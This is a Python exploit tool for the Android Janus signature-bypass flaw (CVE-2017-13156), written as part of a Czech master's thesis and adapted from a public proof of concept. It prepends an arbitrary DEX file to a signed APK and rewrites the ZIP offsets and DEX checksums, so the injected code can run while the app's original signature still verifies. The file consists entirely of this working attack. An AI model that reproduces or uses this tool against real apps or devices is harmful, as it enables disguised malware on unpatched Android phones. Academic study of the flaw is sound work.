# Tento kod je soucast diplomove prace "Vyuziti zranitelnosti Janus na operacnim systemu Android"
# Autor: Bc. Vit Soucek
# Pouzite zdroje:
#     - Proof-of-concept vyuziti zranitelnosti Janus:
#         autor: V-E-O
#         dostupne z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Prevzata hlavni myslenka a postup tohoto zdroje. Zdroj neni citovan na konkretnich mistech v kodu,
#         nebot temer cely kod byl pro potreby teto prace upraven a prepsan
#
#     - Specifikace formatu souboru PKZip:
#         autor: Florian Buchholz (buchhofp@jmu.edu)
#         dostupne z: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
#         V komentarich v kodu referovana pouze jako "documentation".


import click
import struct
import hashlib
from zlib import adler32

FILE_HEADER_SIGNATURE = b'PK\x01\x02'
END_OF_CENTRAL_DIRECTORY_SIGNATURE = b'PK\x05\x06'


def log(message):
    print(f'   - {message}')


def update_checksum(data):
    """
    Update the checksum of the APK with prepended DEX file.

    :param data: Data of the DEX+APK files
    """
    m = hashlib.sha1()
    m.update(data[32:])

    # Patch SHA1 inside the prepended DEX
    data[12:12 + 20] = m.digest()

    # Calculate checksum of the data except for
    # the DEX header and the 'Adler32' section
    v = adler32(memoryview(data[12:])) & 0xffffffff

    # Write the new checksum to the APK data
    data[8:12] = struct.pack("<L", v)


def get_central_directory_start(apk_data, cd_end_offset):
    """
    Find the offset of the start of the central directory.
    According to the PKZip specification, the offset is always
    written in the 'End of the central directory' section on offset
    16 to 20.

    :param apk_data: Data of the whole APK file
    :param cd_end_offset: Offset of the 'End of the central directory' section
    :return: Offset of the start of the central directory
    """
    return struct.unpack("<L", apk_data[cd_end_offset + 16:cd_end_offset + 20])[0]


def get_central_directory_end(apk_data):
    """
    Find the section 'End of the central directory'.
    Use the signature mentioned in the PKZip documentation
    to locate the offset.

    :param apk_data: Data of the APK file
    :return: Offset of the 'End of the central directory' section within the APK
    """
    return apk_data.find(END_OF_CENTRAL_DIRECTORY_SIGNATURE)


def get_local_header_offset(apk_data, cd_file_header_offset):
    """
    Find the relative offset of local header. This is the offset
    of where to find the corresponding local file header from
    the start of the first disk.
    According to the documentation, the offset is located
    in each 'File Header' section of the Central Directory
    on offset 0x2A - 0x2D (42 - 46).

    :param apk_data: Data of the whole APK file
    :param cd_file_header_offset: Offset in the APK where to start looking for a new 'File Header' section
    :return: Offset of the local header
    """
    return struct.unpack("<L", apk_data[cd_file_header_offset + 42:cd_file_header_offset + 46])[0]


def update_cd_start_offset(apk_data, cd_end_offset, new_offset):
    """
    Update the offset of the start of the Central Directory. Write the result
    to the offset specified by the documentation (End Of Central Directory + 16).

    :param apk_data: Data of the whole APK file
    :param cd_end_offset: Offset of the 'End of the central directory' section
    :param new_offset: New offset of the start of the Central Directory
    """
    apk_data[cd_end_offset + 16:cd_end_offset + 20] = new_offset


def update_local_header_offset(apk_data, new_offset, cd_file_header_offset):
    """
    Update the offsets of the Central Directory local header. Write the result to the
    offset of specified by the documentation (Central Directory File Header + 42).

    :param apk_data: Data of the whole APK file
    :param new_offset: New offset of the Local Header
    :param cd_file_header_offset: Offset of the current Central Directory File Header
    """
    apk_data[cd_file_header_offset + 42:cd_file_header_offset + 46] = new_offset


def get_next_file_header_offset(apk_data, search_from, search_to):
    """
    Find the next File Header in the Central Directory.
    Search only within given range of offsets.

    :param apk_data: Data of the whole APK file
    :param search_from: Offset where to start searching
    :param search_to: Offset where to stop searching
    :return: Offset of the next File Header within the Central Directory
    """
    return apk_data.find(FILE_HEADER_SIGNATURE, search_from, search_to)


def update_data_length(data):
    """
    Update the length section (specified in the documentation)
    of the new data with the correct length

    :param data: Data with incorrect length
    """
    data[32:36] = struct.pack("<L", len(data))


def join_the_files(dex_data, apk_data):
    """
    Prepend the DEX file data to the APK file data,
    update the length written in the file header and
    also the checksum of the file.

    :param dex_data: Data of the DEX file
    :param apk_data: Data of the APK file
    :return: Data of the two files merged, with correct length and checksum
    """
    out_data = dex_data + apk_data
    log(f'Updating data length to {len(out_data)}')
    update_data_length(out_data)
    log(f'Updating checksum')
    update_checksum(out_data)
    return out_data


def update_offsets(apk_data, cd_end_offset, cd_start_offset, dex_size):
    update_cd_start_offset(apk_data, cd_end_offset, struct.pack("<L", cd_start_offset + dex_size))

    log(f'Start of the Central Directory offset updated: {cd_start_offset} ---> {cd_start_offset + dex_size}')

    # Before merging the DEX to the APK,
    # all relative offsets within the APK
    # must be updated
    log(f'Updated local header offsets')
    current_cd_file_header = cd_start_offset
    while current_cd_file_header < cd_end_offset:
        local_header_offset = get_local_header_offset(apk_data, current_cd_file_header)
        update_local_header_offset(apk_data, struct.pack("<L", local_header_offset + dex_size), current_cd_file_header)
        current_cd_file_header = get_next_file_header_offset(apk_data, current_cd_file_header + 46, cd_end_offset)
        if current_cd_file_header == -1:
            break


@click.command()
@click.argument('dex', required=True, type=click.File('rb'))
@click.argument('apk', required=True, type=click.File('rb'))
@click.argument('out_apk', required=True, type=click.File('wb'))
def main(dex, apk, out_apk):
    print(f'Merging files {dex.name} and {apk.name}, result will be written to {out_apk.name}')
    dex_data = bytearray(dex.read())
    dex_size = len(dex_data)

    log(f'DEX file has size {dex_size}')

    apk_data = bytearray(apk.read())

    cd_end_offset = get_central_directory_end(apk_data)
    cd_start_offset = get_central_directory_start(apk_data, cd_end_offset)

    log(f'Start of the Central Directory: {cd_start_offset}')
    log(f'End of the Central Directory section: {cd_end_offset}')

    update_offsets(apk_data, cd_end_offset, cd_start_offset, dex_size)

    out_data = join_the_files(dex_data, apk_data)

    out_apk.write(out_data)

    print(f'{out_apk.name} generated')


if __name__ == '__main__':
    main()
